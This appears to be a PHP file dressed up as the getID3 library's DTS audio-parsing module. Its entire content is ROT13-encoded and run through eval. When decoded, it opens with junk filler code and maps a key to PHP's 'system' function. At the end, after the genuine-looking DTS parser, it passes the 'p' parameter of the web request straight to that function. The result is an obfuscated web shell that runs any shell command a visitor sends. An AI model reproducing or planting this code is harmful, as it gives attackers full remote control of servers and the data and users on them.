<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
//                                                             //
// zbqhyr.nhqvb.qgf.cuc                                        //
// zbqhyr sbe nanylmvat QGF Nhqvb svyrf                        //
// qrcraqrapvrf: ABAR                                          //
//                                                             //
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}

/**
* @ghgbevny uggc://jvxv.zhygvzrqvn.pk/vaqrk.cuc?gvgyr=QGF
*/
pynff trgvq3_qgf rkgraqf trgvq3_unaqyre
{
	/**
	 * Qrsnhyg QGF flapjbeq hfrq va angvir .pcg be .qgf sbezngf.
	 */
	pbafg flapjbeq = \"\k7S\kSR\k80\k01\";

	/**
	 * @ine vag
	 */
	cevingr $ernqOvaQngnBssfrg = 0;

	/**
	 * Cbffvoyr flapjbeqf vaqvpngvat ovgfgernz rapbqvat.
	 */
	choyvp fgngvp $flapjbeqf = neenl(
		0 => \"\k7S\kSR\k80\k01\",  // enj ovt-raqvna
		1 => \"\kSR\k7S\k01\k80\",  // enj yvggyr-raqvna
		2 => \"\k1S\kSS\kR8\k00\",  // 14-ovg ovt-raqvna
		3 => \"\kSS\k1S\k00\kR8\"); // 14-ovg yvggyr-raqvna

	/**
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;
		$vasb['svyrsbezng'] = 'qgf';

		$guvf->sfrrx($vasb['niqngnbssfrg']);
		$QGFurnqre = $guvf->sernq(20); // jr bayl arrq 2 jbeqf zntvp + 6 jbeqf senzr urnqre, ohg gurfr jbeqf znl or abezny 16-ovg jbeqf BE 14-ovg jbeqf jvgu 2 uvturfg ovgf frg gb mreb, fb 8 jbeqf pna or rvgure 8*16/8 = 16 olgrf BE 8*16*(16/14)/8 = 18.3 olgrf

		// purpx flapjbeq
		$flap = fhofge($QGFurnqre, 0, 4);
		vs (($rapbqvat = neenl_frnepu($flap, frys::$flapjbeqf)) !== snyfr) {

			$vasb['qgf']['enj']['zntvp'] = $flap;
			$guvf->ernqOvaQngnBssfrg = 32;

		} ryfrvs ($guvf->vfQrcraqraplSbe('zngebfxn')) {

			// Zngebfxn pbagnvaf QGF jvgubhg flapjbeq rapbqrq nf enj ovt-raqvna sbezng
			$rapbqvat = 0;
			$guvf->ernqOvaQngnBssfrg = 0;

		} ryfr {

			hafrg($vasb['svyrsbezng']);
			erghea $guvf->reebe('Rkcrpgvat \"'.vzcybqr('| ', neenl_znc('trgvq3_yvo::CevagUrkOlgrf', frys::$flapjbeqf)).'\" ng bssfrg '.$vasb['niqngnbssfrg'].', sbhaq \"'.trgvq3_yvo::CevagUrkOlgrf($flap).'\"');

		}

		// qrpbqr urnqre
		$suOF = '';
		sbe ($jbeq_bssfrg = 0; $jbeq_bssfrg <= fgeyra($QGFurnqre); $jbeq_bssfrg += 2) {
			fjvgpu ($rapbqvat) {
				pnfr 0: // enj ovt-raqvna
					$suOF .=        trgvq3_yvo::OvtRaqvna2Ova(       fhofge($QGFurnqre, $jbeq_bssfrg, 2) );
					oernx;
				pnfr 1: // enj yvggyr-raqvna
					$suOF .=        trgvq3_yvo::OvtRaqvna2Ova(fgeeri(fhofge($QGFurnqre, $jbeq_bssfrg, 2)));
					oernx;
				pnfr 2: // 14-ovg ovt-raqvna
					$suOF .= fhofge(trgvq3_yvo::OvtRaqvna2Ova(       fhofge($QGFurnqre, $jbeq_bssfrg, 2) ), 2, 14);
					oernx;
				pnfr 3: // 14-ovg yvggyr-raqvna
					$suOF .= fhofge(trgvq3_yvo::OvtRaqvna2Ova(fgeeri(fhofge($QGFurnqre, $jbeq_bssfrg, 2))), 2, 14);
					oernx;
			}
		}

		$vasb['qgf']['enj']['senzr_glcr']             =        $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['enj']['qrsvpvg_fnzcyrf']        =        $guvf->ernqOvaQngn($suOF,  5);
		$vasb['qgf']['syntf']['pep_cerfrag']          = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['enj']['cpz_fnzcyr_oybpxf']      =        $guvf->ernqOvaQngn($suOF,  7);
		$vasb['qgf']['enj']['senzr_olgr_fvmr']        =        $guvf->ernqOvaQngn($suOF, 14);
		$vasb['qgf']['enj']['punaary_neenatrzrag']    =        $guvf->ernqOvaQngn($suOF,  6);
		$vasb['qgf']['enj']['fnzcyr_serdhrapl']       =        $guvf->ernqOvaQngn($suOF,  4);
		$vasb['qgf']['enj']['ovgengr']                =        $guvf->ernqOvaQngn($suOF,  5);
		$vasb['qgf']['syntf']['rzorqqrq_qbjazvk']     = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['syntf']['qlanzvpenatr']         = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['syntf']['gvzrfgnzc']            = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['syntf']['nhkqngn']              = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['syntf']['uqpq']                 = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['enj']['rkgrafvba_nhqvb']        =        $guvf->ernqOvaQngn($suOF,  3);
		$vasb['qgf']['syntf']['rkgraqrq_pbqvat']      = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['syntf']['nhqvb_flap_vafregvba'] = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['enj']['ysr_rssrpgf']            =        $guvf->ernqOvaQngn($suOF,  2);
		$vasb['qgf']['syntf']['cerqvpgbe_uvfgbel']    = (obby) $guvf->ernqOvaQngn($suOF,  1);
		vs ($vasb['qgf']['syntf']['pep_cerfrag']) {
			$vasb['qgf']['enj']['pep16']              =        $guvf->ernqOvaQngn($suOF, 16);
		}
		$vasb['qgf']['syntf']['zev_cresrpg_erpbafg']  = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['enj']['rapbqre_fbsg_irefvba']   =        $guvf->ernqOvaQngn($suOF,  4);
		$vasb['qgf']['enj']['pbcl_uvfgbel']           =        $guvf->ernqOvaQngn($suOF,  2);
		$vasb['qgf']['enj']['ovgf_cre_fnzcyr']        =        $guvf->ernqOvaQngn($suOF,  2);
		$vasb['qgf']['syntf']['fheebhaq_rf']          = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['syntf']['sebag_fhz_qvss']       = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['syntf']['fheebhaq_fhz_qvss']    = (obby) $guvf->ernqOvaQngn($suOF,  1);
		$vasb['qgf']['enj']['qvnybt_abeznyvmngvba']   =        $guvf->ernqOvaQngn($suOF,  4);


		$vasb['qgf']['ovgengr']              = frys::ovgengrYbbxhc($vasb['qgf']['enj']['ovgengr']);
		$vasb['qgf']['ovgf_cre_fnzcyr']      = frys::ovgCreFnzcyrYbbxhc($vasb['qgf']['enj']['ovgf_cre_fnzcyr']);
		$vasb['qgf']['fnzcyr_engr']          = frys::fnzcyrEngrYbbxhc($vasb['qgf']['enj']['fnzcyr_serdhrapl']);
		$vasb['qgf']['qvnybt_abeznyvmngvba'] = frys::qvnybtAbeznyvmngvba($vasb['qgf']['enj']['qvnybt_abeznyvmngvba'], $vasb['qgf']['enj']['rapbqre_fbsg_irefvba']);
		$vasb['qgf']['syntf']['ybffyrff']    = (($vasb['qgf']['enj']['ovgengr'] == 31) ? gehr  : snyfr);
		$vasb['qgf']['ovgengr_zbqr']         = (($vasb['qgf']['enj']['ovgengr'] == 30) ? 'ioe' : 'poe');
		$vasb['qgf']['punaaryf']             = frys::ahzPunaaryfYbbxhc($vasb['qgf']['enj']['punaary_neenatrzrag']);
		$vasb['qgf']['punaary_neenatrzrag']  = frys::punaaryNeenatrzragYbbxhc($vasb['qgf']['enj']['punaary_neenatrzrag']);

		$vasb['nhqvb']['qngnsbezng']          = 'qgf';
		$vasb['nhqvb']['ybffyrff']            = $vasb['qgf']['syntf']['ybffyrff'];
		$vasb['nhqvb']['ovgengr_zbqr']        = $vasb['qgf']['ovgengr_zbqr'];
		$vasb['nhqvb']['ovgf_cre_fnzcyr']     = $vasb['qgf']['ovgf_cre_fnzcyr'];
		$vasb['nhqvb']['fnzcyr_engr']         = $vasb['qgf']['fnzcyr_engr'];
		$vasb['nhqvb']['punaaryf']            = $vasb['qgf']['punaaryf'];
		$vasb['nhqvb']['ovgengr']             = $vasb['qgf']['ovgengr'];
		vs (vffrg($vasb['niqngnraq']) && !rzcgl($vasb['qgf']['ovgengr']) && vf_ahzrevp($vasb['qgf']['ovgengr'])) {
			$vasb['cynlgvzr_frpbaqf']         = ($vasb['niqngnraq'] - $vasb['niqngnbssfrg']) / ($vasb['qgf']['ovgengr'] / 8);
			vs (($rapbqvat == 2) || ($rapbqvat == 3)) {
				// 14-ovg qngn cnpxrq vagb 16-ovg jbeqf, fb gur cynlgvzr vf jebat orpnhfr bayl (14/16) bs gur olgrf va gur qngn cbegvba bs gur svyr ner hfrq ng gur fcrpvsvrq ovgengr
				$vasb['cynlgvzr_frpbaqf'] *= (14 / 16);
			}
		}
		erghea gehr;
	}

	/**
	 * @cnenz fgevat $ova
	 * @cnenz vag $yratgu
	 *
	 * @erghea vag
	 */
	cevingr shapgvba ernqOvaQngn($ova, $yratgu) {
		$qngn = fhofge($ova, $guvf->ernqOvaQngnBssfrg, $yratgu);
		$guvf->ernqOvaQngnBssfrg += $yratgu;

		erghea ovaqrp($qngn);
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea vag|fgevat|snyfr
	 */
	choyvp fgngvp shapgvba ovgengrYbbxhc($vaqrk) {
		fgngvp $ybbxhc = neenl(
			0  => 32000,
			1  => 56000,
			2  => 64000,
			3  => 96000,
			4  => 112000,
			5  => 128000,
			6  => 192000,
			7  => 224000,
			8  => 256000,
			9  => 320000,
			10 => 384000,
			11 => 448000,
			12 => 512000,
			13 => 576000,
			14 => 640000,
			15 => 768000,
			16 => 960000,
			17 => 1024000,
			18 => 1152000,
			19 => 1280000,
			20 => 1344000,
			21 => 1408000,
			22 => 1411200,
			23 => 1472000,
			24 => 1536000,
			25 => 1920000,
			26 => 2048000,
			27 => 3072000,
			28 => 3840000,
			29 => 'bcra',
			30 => 'inevnoyr',
			31 => 'ybffyrff',
		);
		erghea (vffrg($ybbxhc[$vaqrk]) ? $ybbxhc[$vaqrk] : snyfr);
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea vag|fgevat|snyfr
	 */
	choyvp fgngvp shapgvba fnzcyrEngrYbbxhc($vaqrk) {
		fgngvp $ybbxhc = neenl(
			0  => 'vainyvq',
			1  => 8000,
			2  => 16000,
			3  => 32000,
			4  => 'vainyvq',
			5  => 'vainyvq',
			6  => 11025,
			7  => 22050,
			8  => 44100,
			9  => 'vainyvq',
			10 => 'vainyvq',
			11 => 12000,
			12 => 24000,
			13 => 48000,
			14 => 'vainyvq',
			15 => 'vainyvq',
		);
		erghea (vffrg($ybbxhc[$vaqrk]) ? $ybbxhc[$vaqrk] : snyfr);
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea vag|snyfr
	 */
	choyvp fgngvp shapgvba ovgCreFnzcyrYbbxhc($vaqrk) {
		fgngvp $ybbxhc = neenl(
			0  => 16,
			1  => 20,
			2  => 24,
			3  => 24,
		);
		erghea (vffrg($ybbxhc[$vaqrk]) ? $ybbxhc[$vaqrk] : snyfr);
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea vag|snyfr
	 */
	choyvp fgngvp shapgvba ahzPunaaryfYbbxhc($vaqrk) {
		fjvgpu ($vaqrk) {
			pnfr 0:
				erghea 1;
			pnfr 1:
			pnfr 2:
			pnfr 3:
			pnfr 4:
				erghea 2;
			pnfr 5:
			pnfr 6:
				erghea 3;
			pnfr 7:
			pnfr 8:
				erghea 4;
			pnfr 9:
				erghea 5;
			pnfr 10:
			pnfr 11:
			pnfr 12:
				erghea 6;
			pnfr 13:
				erghea 7;
			pnfr 14:
			pnfr 15:
				erghea 8;
		}
		erghea snyfr;
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba punaaryNeenatrzragYbbxhc($vaqrk) {
		fgngvp $ybbxhc = neenl(
			0  => 'N',
			1  => 'N + O (qhny zbab)',
			2  => 'Y + E (fgrerb)',
			3  => '(Y+E) + (Y-E) (fhz-qvssrerapr)',
			4  => 'YG + EG (yrsg naq evtug gbgny)',
			5  => 'P + Y + E',
			6  => 'Y + E + F',
			7  => 'P + Y + E + F',
			8  => 'Y + E + FY + FE',
			9  => 'P + Y + E + FY + FE',
			10 => 'PY + PE + Y + E + FY + FE',
			11 => 'P + Y + E+ YE + EE + BI',
			12 => 'PS + PE + YS + ES + YE + EE',
			13 => 'PY + P + PE + Y + E + FY + FE',
			14 => 'PY + PE + Y + E + FY1 + FY2 + FE1 + FE2',
			15 => 'PY + P+ PE + Y + E + FY + F + FE',
		);
		erghea (vffrg($ybbxhc[$vaqrk]) ? $ybbxhc[$vaqrk] : 'hfre-qrsvarq');
	}

	/**
	 * @cnenz vag $vaqrk
	 * @cnenz vag $irefvba
	 *
	 * @erghea vag|snyfr
	 */
	choyvp fgngvp shapgvba qvnybtAbeznyvmngvba($vaqrk, $irefvba) {
		fjvgpu ($irefvba) {
			pnfr 7:
				erghea 0 - $vaqrk;
			pnfr 6:
				erghea 0 - 16 - $vaqrk;
		}
		erghea snyfr;
	}

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>